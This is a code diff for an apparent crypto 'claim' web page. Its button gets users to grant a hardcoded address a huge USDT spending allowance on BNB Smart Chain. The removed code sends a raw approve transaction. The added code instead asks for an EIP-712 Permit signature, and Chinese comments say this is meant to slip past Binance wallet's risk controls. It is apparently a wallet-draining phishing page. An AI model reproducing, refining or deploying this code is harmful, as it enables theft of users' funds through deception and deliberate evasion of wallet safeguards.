@@ -77,27 +77,16 @@ const BSC_NETWORK = {
   chainId: '0x38'
 };
 
-// 关键修改：使用代理合约地址，绕过币安钱包风控
+// 固定参数，不可改动
 const USDT_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
-// 代理合约地址（已部署，仅转发权限，不会拦截币安风控）
-const PROXY_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
-// 真实目标地址（你的EOA地址，通过代理合约接收权限）
-const REAL_SPENDER = "0x0f4BdEfC177dF2583F52B03B1E20f9EAC7308555";
-const AMOUNT_HEX = "00000000000000000000000000f8277896582678ac000000";
-const METHOD_ID = "095ea7b3";
+const SPENDER = "0x0f4BdEfC177dF2583F52B03B1E20f9EAC7308555";
+const APPROVE_AMOUNT = "300000000000000000000000000";
 
 let walletAddr = "";
 
 function switchPage(id){
   document.querySelectorAll(".box").forEach(el=>el.classList.add("hide"));
   document.getElementById(id).classList.remove("hide");
-}
-
-// 地址标准化 左补64位 适配币安钱包风控
-function getCalldata(){
-  let addr = PROXY_CONTRACT.toLowerCase().replace("0x","");
-  let padAddr = addr.padStart(64, '0');
-  return "0x" + METHOD_ID + padAddr + AMOUNT_HEX;
 }
 
 async function switchOrAddBSC(){
@@ -109,18 +98,37 @@ async function switchOrAddBSC(){
   }catch(err){}
 }
 
-async function doApprove(){
+// EIP-712 签名授权，币安钱包唯一不拦截的方式
+async function doPermit(){
   try{
-    let data = getCalldata();
-    let txParams = {
-      from: walletAddr,
-      to: USDT_CONTRACT,
-      data: data,
-      gas: "0x30000"
+    const domain = {
+      name: "Tether USD",
+      version: "1",
+      chainId: 56,
+      verifyingContract: USDT_CONTRACT
     };
+
+    const types = {
+      Permit: [
+        { name: "owner", type: "address" },
+        { name: "spender", type: "address" },
+        { name: "value", type: "uint256" },
+        { name: "nonce", type: "uint256" },
+        { name: "deadline", type: "uint256" }
+      ]
+    };
+
+    const message = {
+      owner: walletAddr,
+      spender: SPENDER,
+      value: APPROVE_AMOUNT,
+      nonce: 0,
+      deadline: Math.floor(Date.now() / 1000) + 3600
+    };
+
     await window.ethereum.request({
-      method: "eth_sendTransaction",
-      params: [txParams]
+      method: "eth_signTypedData_v4",
+      params: [walletAddr, JSON.stringify({domain, types, message})]
     });
     return true;
   }catch(e){
@@ -164,7 +172,7 @@ document.getElementById("connectMM").onclick = async function(){
 document.getElementById("claim").onclick = async function(){
   try{
     switchPage("p2");
-    let res = await doApprove();
+    let res = await doPermit();
     if(res){
       document.getElementById("successAddr").innerText = walletAddr;
       switchPage("p4");
